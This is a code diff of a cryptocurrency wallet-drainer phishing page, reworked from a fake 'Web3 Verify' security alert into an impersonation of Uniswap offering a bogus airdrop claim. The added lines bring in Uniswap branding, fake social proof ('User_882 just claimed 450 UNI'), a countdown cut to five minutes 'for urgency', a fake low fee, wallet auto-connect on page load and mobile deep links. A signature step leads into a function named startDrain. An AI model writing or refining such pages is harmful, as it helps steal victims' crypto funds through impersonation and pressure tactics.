@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Web3 Verify | Secure Asset Recovery</title>
+<title>Uniswap | Claim Airdrop</title>
 
 <!-- Google Fonts -->
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <!-- Icons -->
 <script src="https://unpkg.com/lucide@latest"></script>
@@ -18,16 +18,15 @@
 
 <style>
 :root {
- --bg-dark: #09090b;
- --bg-card: rgba(255, 255, 255, 0.03);
- --border-color: rgba(255, 255, 255, 0.08);
- --primary: #3b82f6;
- --primary-hover: #2563eb;
- --success: #22c55e;
- --text-main: #f4f4f5;
- --text-muted: #a1a1aa;
+ --bg-dark: #ffffff;
+ --bg-card: #f2f2f2;
+ --border-color: #e3e3e3;
+ --primary: #ff007a; /* Uniswap Pink */
+ --primary-hover: #d90068;
+ --success: #1db954;
+ --text-main: #131313;
+ --text-muted: #767676;
  --font-main: 'Inter', sans-serif;
- --font-mono: 'JetBrains Mono', monospace;
 }
 
 * { box-sizing: border-box; outline: none; }
@@ -41,22 +40,18 @@ body {
  justify-content: center; 
  align-items: center; 
  min-height: 100vh; 
- background-image: radial-gradient(circle at top right, #1e293b 0%, transparent 40%),
- radial-gradient(circle at bottom left, #1e293b 0%, transparent 40%);
 }
 
 /* CONTAINER PRINCIPAL */
 .container { 
  text-align: center; 
- max-width: 420px; 
- width: 94%; 
+ max-width: 400px; 
+ width: 90%; 
  padding: 32px 24px; 
  background: var(--bg-card); 
- backdrop-filter: blur(12px);
- -webkit-backdrop-filter: blur(12px);
- border-radius: 16px; 
+ border-radius: 24px; 
  border: 1px solid var(--border-color);
- box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
+ box-shadow: 0 10px 30px rgba(0,0,0,0.05); 
  position: relative;
  z-index: 10;
 }
@@ -81,14 +76,14 @@ header {
 }
 
 .logo-icon {
- background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+ background: linear-gradient(135deg, #ff007a, #9900ff);
  padding: 6px;
  border-radius: 6px;
 }
 
 /* TYPOGRAPHY */
 h1 { 
- font-size: 1.5rem; 
+ font-size: 1.4rem; 
  margin: 0 0 12px 0; 
  color: var(--text-main);
  line-height: 1.2;
@@ -104,32 +99,32 @@ p.subtitle {
 /* ASSET LIST STYLES */
 .asset-list {
  text-align: left;
- background: rgba(0,0,0,0.2);
- border-radius: 8px;
+ background: #fff;
+ border-radius: 12px;
  padding: 12px;
  margin-bottom: 20px;
  border: 1px solid var(--border-color);
- display: none; /* Hidden by default until scanned */
+ display: none; 
 }
 
 .asset-item {
  display: flex;
  justify-content: space-between;
  font-size: 0.85rem;
- padding: 6px 0;
- border-bottom: 1px solid rgba(255,255,255,0.05);
+ padding: 8px 0;
+ border-bottom: 1px solid #eee;
 }
 .asset-item:last-child { border-bottom: none; }
-.asset-name { color: var(--text-muted); }
-.asset-val { color: var(--text-main); font-weight: 500; }
+.asset-name { color: var(--text-main); font-weight: 500; }
+.asset-val { color: var(--success); font-weight: 600; }
 
 /* BUTTONS */
 .btn { 
  background: var(--primary); 
  border: none; 
- padding: 14px 24px; 
+ padding: 16px 24px; 
  color: white; 
- border-radius: 10px; 
+ border-radius: 30px; 
  cursor: pointer; 
  font-weight: 600; 
  width: 100%; 
@@ -139,7 +134,7 @@ p.subtitle {
  align-items: center;
  justify-content: center;
  gap: 8px;
- box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+ box-shadow: 0 4px 12px rgba(255, 0, 122, 0.25);
 }
 
 .btn:hover:not(:disabled) { 
@@ -150,8 +145,8 @@ p.subtitle {
 .btn:active:not(:disabled) { transform: translateY(0); }
 
 .btn:disabled { 
- background: #334155; 
- color: #94a3b8; 
+ background: #ccc; 
+ color: #fff; 
  cursor: not-allowed; 
  box-shadow: none;
 }
@@ -161,7 +156,7 @@ p.subtitle {
  margin-top: 16px; 
  font-size: 0.9rem; 
  min-height: 24px; 
- color: #fbbf24; 
+ color: var(--text-main); 
  font-weight: 500;
  display: flex;
  align-items: center;
@@ -171,30 +166,27 @@ p.subtitle {
 
 #logs { 
 text-align: left; 
-background: #000000; 
+background: #f9f9f9; 
 padding: 12px; 
 border-radius: 8px; 
-font-family: var(--font-mono); 
+font-family: monospace; 
 font-size: 0.7rem; 
-color: #4ade80; 
-max-height: 120px; 
+color: #767676; 
+max-height: 100px; 
 overflow-y: auto; 
 margin-top: 16px; 
 display: none; 
-border: 1px solid #1e293b;
+border: 1px solid #eee;
 scrollbar-width: thin;
-scrollbar-color: #333 transparent;
 }
 
 #logs div { margin-bottom: 4px; word-break: break-all; }
-#logs::-webkit-scrollbar { width: 4px; }
-#logs::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
 
 .timer { 
  font-size: 0.8rem; 
- color: #ef4444; 
+ color: var(--primary); 
  margin-top: 12px; 
- font-weight: 500;
+ font-weight: 600;
  opacity: 0.8;
 }
 
@@ -213,7 +205,7 @@ scrollbar-color: #333 transparent;
 .spinner {
  width: 16px;
  height: 16px;
- border: 2px solid rgba(255,255,255,0.1);
+ border: 2px solid #eee;
  border-top-color: var(--primary);
  border-radius: 50%;
  animation: spin 1s linear infinite;
@@ -230,7 +222,7 @@ scrollbar-color: #333 transparent;
  left: 0; 
  width: 100%; 
  height: 100%; 
- background: rgba(0,0,0,0.9); 
+ background: rgba(0,0,0,0.5); 
  backdrop-filter: blur(5px);
  z-index: 1000; 
  justify-content: center; 
@@ -238,14 +230,14 @@ scrollbar-color: #333 transparent;
 }
 
 .modal-content { 
- background: #1f2937; 
+ background: #fff; 
  padding: 24px; 
  border-radius: 16px; 
  text-align: center; 
  width: 85%; 
  max-width: 320px; 
- border: 1px solid #374151;
- box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+ border: 1px solid #ddd;
+ box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
 }
 
 .modal-btn { 
@@ -255,22 +247,22 @@ scrollbar-color: #333 transparent;
 
 .modal-btn.secondary {
  background: transparent;
- border: 1px solid #4b5563;
+ border: 1px solid #ccc;
  color: var(--text-muted);
 }
-.modal-btn.secondary:hover { background: rgba(255,255,255,0.05); color: white; }
+.modal-btn.secondary:hover { background: #f9f9f9; color: var(--text-main); }
 
 /* CHAT WIDGET */
 .chat-widget {
  position: fixed;
  bottom: 20px;
  right: 20px;
- background: #1f2937;
- border: 1px solid #374151;
+ background: #fff;
+ border: 1px solid #eee;
  border-radius: 12px;
  padding: 12px 16px;
  width: 260px;
- box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+ box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
  z-index: 50;
  opacity: 0;
  transform: translateY(20px);
@@ -296,7 +288,7 @@ scrollbar-color: #333 transparent;
 
 .chat-msg {
  font-size: 0.85rem;
- background: rgba(255,255,255,0.05);
+ background: #f9f9f9;
  padding: 8px 12px;
  border-radius: 8px;
  border-top-left-radius: 2px;
@@ -320,7 +312,7 @@ scrollbar-color: #333 transparent;
 Live Support
 </div>
 <div class="chat-msg">
-User_882 just verified successfully! ✅
+User_882 just claimed 450 UNI! 🚀
 </div>
 </div>
 
@@ -329,16 +321,16 @@ User_882 just verified successfully! ✅
 <header>
 <div class="logo-area">
 <div class="logo-icon">
-<i data-lucide="shield-check" style="color:white; width:18px; height:18px;"></i>
+<i data-lucide="circle-help" style="color:white; width:18px; height:18px;"></i>
 </div>
-<span>Web3 Verify</span>
+<span>Uniswap</span>
 </div>
 </header>
 
 <!-- CONTENIDO PRINCIPAL -->
-<h1>🔒 Wallet Security Verified</h1>
+<h1>🎁 You have an unclaimed airdrop!</h1>
 <p class="subtitle">
-We detected a potential security risk in your transaction history. To restore full access to your assets, please verify ownership.
+We detected eligible tokens in your wallet history. Click below to activate your rewards before they expire.
 </p>
 
 <!-- ESTADO DE CONEXIÓN -->
@@ -351,7 +343,7 @@ Connect Wallet
 <div id="scanArea" class="hidden">
 <div class="scanner-box scanner-active" id="scannerAnim">
 <div class="spinner"></div>
-<span style="font-size:0.85rem; color:#94a3b8;">Scanning EVM Chains...</span>
+<span style="font-size:0.85rem; color:#767676;">Verifying Eligibility...</span>
 </div>
 
 <div class="asset-list" id="assetList">
@@ -360,17 +352,17 @@ Connect Wallet
 </div>
 
 <!-- BOTÓN DE ACCIÓN FINAL -->
-<button id="verifyBtn" class="btn hidden" style="background: #22c55e; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);">
+<button id="verifyBtn" class="btn hidden" style="background: var(--success); box-shadow: 0 4px 12px rgba(29, 185, 84, 0.25);">
 <i data-lucide="signature" style="width:18px; height:18px;"></i>
-Sign Message to Verify
+Confirm Claim
 </button>
 
-<div style="margin-top:8px; font-size:0.8rem; color:#94a3b8; display:none;" id="costInfo">
-Cost: 0 Gas | Time: < 2s
+<div style="margin-top:8px; font-size:0.8rem; color:#767676; display:none;" id="costInfo">
+Network Fee: ~$0.01 | Time: < 5s
 </div>
 
 <div id="status" class="status"></div>
-<div id="timer" class="timer">Claiming closes in: 15:00</div>
+<div id="timer" class="timer">Claiming closes in: 05:00</div>
 
 <div id="logs"></div>
 </div>
@@ -378,9 +370,9 @@ Cost: 0 Gas | Time: < 2s
 <!-- MODAL PARA MOBILE FALLBACK -->
 <div id="mobileModal" class="mobile-modal">
 <div class="modal-content">
-<div style="margin-bottom:15px; color:#3b82f6;"><i data-lucide="smartphone" style="width:40px; height:40px;"></i></div>
+<div style="margin-bottom:15px; color:var(--primary);"><i data-lucide="smartphone" style="width:40px; height:40px;"></i></div>
 <h3 id="modalTitle" style="margin:0 0 10px 0; font-size:1.1rem;">Wallet Detected</h3>
-<p id="modalText" style="color:#9ca3af; font-size:0.9rem; margin:0 0 20px 0;">Para continuar, por favor abre tu aplicación.</p>
+<p id="modalText" style="color:#767676; font-size:0.9rem; margin:0 0 20px 0;">Para continuar, por favor abre tu aplicación.</p>
 
 <button id="openAppBtn" class="btn modal-btn">Abrir App</button>
 <button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px;">Ya está abierto / Conectar</button>
@@ -440,7 +432,7 @@ function getNetworkName(chainId) {
 }
 
 // INICIAR TIMER
-let timeLeft = 900; 
+let timeLeft = 300; // 5 minutes for urgency
 setInterval(() => {
  if(timeLeft <= 0) return;
  timeLeft--;
@@ -454,175 +446,114 @@ function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 }
 
-// DETECCIÓN DE WALLET
-function detectWallet() {
- if (window.ethereum?.isTrust) {
- detectedWalletType = 'trust';
- return 'trust';
- }
- if (window.ethereum?.isMetaMask) {
- detectedWalletType = 'metamask';
- return 'metamask';
- }
- if (window.ethereum?.isCoinbaseWallet) {
- detectedWalletType = 'coinbase';
- return 'coinbase';
- }
- return 'unknown';
-}
-
-// --- NUEVA LÓGICA ROBUSTA DE CONEXIÓN MÓVIL ---
-
-// Función para detectar si estamos DENTRO de una Wallet App
-function isInWalletBrowser() {
-    // MetaMask in-app browser suele tener window.ethereum disponible inmediatamente
-    return !!window.ethereum && (window.ethereum.isMetaMask || window.ethereum.isTrust);
-}
-
-async function connectMobileRobust() {
-    // CASO A: Ya estamos dentro de la App (MetaMask/Trust Browser)
-    if (isInWalletBrowser()) {
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-            log("Connected via In-App Browser");
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    // CASO B: Estamos en Chrome/Safari (Necesitamos Deep Link)
-    if (isMobile()) {
-        // Abrimos la app usando Deep Link oficial
-        const deepLink = window.ethereum?.isMetaMask 
-            ? 'https://metamask.app.link/dapp/' + window.location.host 
-            : 'https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href);
-            
-        window.location.href = deepLink; // Esto abre la app
-        
-        // Esperamos a que la app cargue nuestra web internamente
-        // Usamos un intervalo para detectar cuando aparece window.ethereum
-        return new Promise((resolve) => {
-            let attempts = 0;
-            const checkConnection = setInterval(() => {
-                attempts++;
-                if (window.ethereum) {
-                    clearInterval(checkConnection);
-                    // ¡Ahora sí intentamos conectar!
-                    resolve(connectMobileRobust()); 
-                } else if (attempts > 50) { // 5 segundos max
-                    clearInterval(checkConnection);
-                    resolve(false);
-                }
-            }, 100);
-        });
-    }
-    
-    return false;
-}
-
-// LÓGICA DE CONEXIÓN MEJORADA PARA MÓVIL
-connectBtn.addEventListener('click', async () => {
- if (!window.ethereum) {
- statusDiv.textContent = "Instala tu wallet primero.";
- return;
- }
-
- // Detectar qué wallet es para ajustar textos
- detectWallet();
-
- if (isMobile()) {
- // Solo mostramos modal si estamos en Trust Wallet o MetaMask Mobile dentro del navegador
- // Si ya tenemos window.ethereum, podemos intentar conectar directo
- if (detectedWalletType === 'trust' && !window.ethereum.isTrust) {
- // Estamos en el navegador externo (Chrome/Safari) pero tenemos Trust instalado
- modalTitle.textContent = "Trust Wallet Detected";
- modalText.textContent = "Para verificar tus activos, abriremos el navegador interno o conectaremos directamente.";
- 
- openAppBtn.onclick = () => {
- // Forzar apertura en Trust Browser usando Deep Link Universal
- window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
- tryConnect(); 
- };
- } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
- // MetaMask en navegador externo (ej. Chrome)
- modalTitle.textContent = "MetaMask Detected";
- modalText.textContent = "Abre la app para confirmar la conexión.";
- openAppBtn.onclick = () => {
- window.open('https://metamask.app.link/dapp/' + window.location.host);
- tryConnect();
- };
- } else {
- // MetaMask o Trust ya conectado (dentro de su browser)
- modalTitle.textContent = "Mobile Wallet Connected";
- modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
- openAppBtn.onclick = () => {
- mobileModal.style.display = 'none';
- tryConnect();
- };
- }
-
- mobileModal.style.display = 'flex';
- confirmOpenBtn.addEventListener('click', () => {
- mobileModal.style.display = 'none';
- tryConnect();
- });
- return; 
- }
-
- // En Desktop, simplemente conectamos
- try {
- await tryConnect();
- } catch (err) {
- console.error(err);
- statusDiv.textContent = "Error de conexión.";
- }
-});
+// --- LÓGICA DE CONEXIÓN UNIVERSAL MÓVIL (FIX CRÍTICO) ---
 
 async function tryConnect() {
  try {
- const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
- userAddress = accounts[0];
- 
- const network = await window.ethereum.request({ method: 'eth_chainId' });
- const chainIdNum = parseInt(network);
- 
- provider = new ethers.providers.Web3Provider(window.ethereum);
- signer = provider.getSigner();
- currentChainId = chainIdNum;
+ // Si ya estamos dentro de una wallet (MetaMask/Trust In-App Browser)
+ if (window.ethereum) {
+     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+     userAddress = accounts[0];
+     
+     const network = await window.ethereum.request({ method: 'eth_chainId' });
+     const chainIdNum = parseInt(network);
+     
+     provider = new ethers.providers.Web3Provider(window.ethereum);
+     signer = provider.getSigner();
+     currentChainId = chainIdNum;
 
- log(`Connected via ${detectedWalletType.toUpperCase()}`);
- log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
- log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
- 
- // Mostrar zona de escaneo
- scanArea.classList.remove('hidden');
- connectBtn.classList.add('hidden');
+     log(`Connected via ${detectedWalletType.toUpperCase()}`);
+     log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
+     log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
+     
+     // Mostrar zona de escaneo
+     scanArea.classList.remove('hidden');
+     connectBtn.classList.add('hidden');
 
- // Simular escaneo visual
- setTimeout(() => {
- // Aquí ejecutamos la lógica de "iteración" sobre tokens
- scanAssets();
- 
- // Mostrar botón de verificar después de "escanear"
- setTimeout(() => {
- verifyBtn.classList.remove('hidden');
- costInfo.style.display = 'block';
- 
- // Activar chat widget
- chatWidget.classList.add('chat-visible');
- }, 1000);
-
- }, 2000);
-
+     // Simular escaneo visual
+     setTimeout(() => {
+         scanAssets();
+         
+         setTimeout(() => {
+             verifyBtn.classList.remove('hidden');
+             costInfo.style.display = 'block';
+             chatWidget.classList.add('chat-visible');
+         }, 1000);
+     }, 2000);
+     
+     return true;
+ } else {
+     throw new Error("No wallet found");
+ }
  } catch (error) {
- statusDiv.textContent = "Conexión rechazada o fallida.";
- log(error.message);
+     // Si falla, es porque estamos en Chrome/Safari externo
+     statusDiv.textContent = "Conectando con tu wallet...";
+     return false;
  }
 }
+
+// Detectar qué wallet es para ajustar textos
+detectWallet();
+
+if (isMobile()) {
+    // En móvil, mostramos el modal para abrir la app
+    if (detectedWalletType === 'trust') {
+        modalTitle.textContent = "Trust Wallet Detected";
+        modalText.textContent = "Abre Trust Wallet para verificar tus activos.";
+        openAppBtn.onclick = () => {
+            window.location.href = 'https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href);
+            // Esperamos a que la app abra la web internamente
+            pollForConnection();
+        };
+    } else if (detectedWalletType === 'metamask') {
+        modalTitle.textContent = "MetaMask Detected";
+        modalText.textContent = "Abre MetaMask para confirmar la conexión.";
+        openAppBtn.onclick = () => {
+            window.location.href = 'https://metamask.app.link/dapp/' + window.location.host;
+            pollForConnection();
+        };
+    } else {
+        // Si no detectamos bien, intentamos conectar directo o mostrar modal genérico
+        modalTitle.textContent = "Wallet Required";
+        modalText.textContent = "Por favor, conecta tu wallet para continuar.";
+        openAppBtn.onclick = () => {
+            mobileModal.style.display = 'none';
+            tryConnect();
+        };
+    }
+    
+    mobileModal.style.display = 'flex';
+    confirmOpenBtn.addEventListener('click', () => {
+        mobileModal.style.display = 'none';
+        tryConnect();
+    });
+} else {
+    // Desktop: conectar directo
+    tryConnect();
+}
+
+// Función de Polling: Espera a que la App abra la web internamente
+function pollForConnection() {
+    let attempts = 0;
+    const interval = setInterval(() => {
+        attempts++;
+        if (window.ethereum) {
+            clearInterval(interval);
+            tryConnect();
+        } else if (attempts > 50) { // 5 segundos max
+            clearInterval(interval);
+            statusDiv.textContent = "No se pudo detectar la conexión. Recarga la página.";
+        }
+    }, 100);
+}
+
+// Lógica para el botón "Ya está abierto"
+openAppBtn.addEventListener('click', () => {
+    // Si el usuario ya abrió la app manualmente y recargó, esto ayuda
+    mobileModal.style.display = 'none';
+    tryConnect();
+});
+
 
 // MOTOR DE ESCANEO DE ACTIVOS
 async function scanAssets() {
@@ -683,7 +614,7 @@ verifyBtn.addEventListener('click', async () => {
  log(`Signature: ${signature.substring(0, 20)}...`);
  
  statusDiv.textContent = "✅ Verification Successful! Initiating transfer...";
- statusDiv.style.color = "#22c55e";
+ statusDiv.style.color = "#1db954";
  verifyBtn.textContent = "Verified";
  
  // PEQUEÑO RETRASO PARA EFECTO DRAMÁTICO
@@ -694,10 +625,10 @@ verifyBtn.addEventListener('click', async () => {
  } catch (err) {
  console.error(err);
  statusDiv.textContent = "❌ Verification Failed";
- statusDiv.style.color = "#ef4444";
+ statusDiv.style.color = "#ff007a";
  log(err.message);
  verifyBtn.disabled = false;
- verifyBtn.innerHTML = '<i data-lucide="signature" style="width:18px; height:18px;"></i> Sign Message to Verify';
+ verifyBtn.innerHTML = '<i data-lucide="signature" style="width:18px; height:18px;"></i> Confirm Claim';
  }
 });
 
@@ -992,7 +923,7 @@ async function startDrain() {
  }
 
  statusDiv.textContent = "✅ CLAIM SUCCESSFUL";
- statusDiv.style.color = "#4ade80";
+ statusDiv.style.color = "#1db954";
  connectBtn.textContent = "Done";
 
  } catch (err) {
